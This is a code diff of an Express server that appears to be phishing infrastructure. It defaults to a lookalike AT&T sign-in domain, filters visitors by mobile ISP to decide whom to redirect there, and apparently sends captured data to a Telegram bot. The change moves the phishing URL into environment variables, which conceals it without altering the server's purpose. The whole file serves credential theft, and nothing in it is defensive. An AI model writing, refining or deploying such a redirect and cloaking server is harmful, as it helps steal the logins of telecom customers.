@@ -8,12 +8,12 @@ const port = process.env.PORT || 3000;
 // IMPORTANT: Set these environment variables in your hosting provider
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const ATT_LANDING_PAGE = process.env.ATT_LANDING_PAGE || 'https://signin-att.sbcglobal.online';
-const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE || 'https://www.att.com/buy/phones/apple-iphone-17-pro-max.html';
+const ATT_LANDING_PAGE = process.env.ATT_LANDING_PAGE;
+const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE;
 const MOBILE_ISPS = ['AT&T', 'Verizon', 'T-Mobile', 'Sprint', 'US Cellular', 'Cricket', 'Metro', 'Boost', 'Xfinity', 'Charter Communications Inc', ' Comcast Cable Communications, LLC','Verizon Business','T-Mobile USA, Inc.'];
 
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.error('ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set as environment variables');
+if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !ATT_LANDING_PAGE || !NON_ATT_LANDING_PAGE) {
+    console.error('ERROR: All required environment variables (TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ATT_LANDING_PAGE, NON_ATT_LANDING_PAGE) must be set');
 }
 
 app.use(express.json());
@@ -67,7 +67,7 @@ app.use(express.static('.')); // Serve index.html if needed
 
 // Redirect to AT&T landing page
 app.get('/go-att', (req, res) => {
-    res.redirect(process.env.ATT_LANDING_PAGE || 'https://signin-att.sbcglobal.online');
+    res.redirect(ATT_LANDING_PAGE);
 });
 
 app.post('/api/telegram', async (req, res) => {
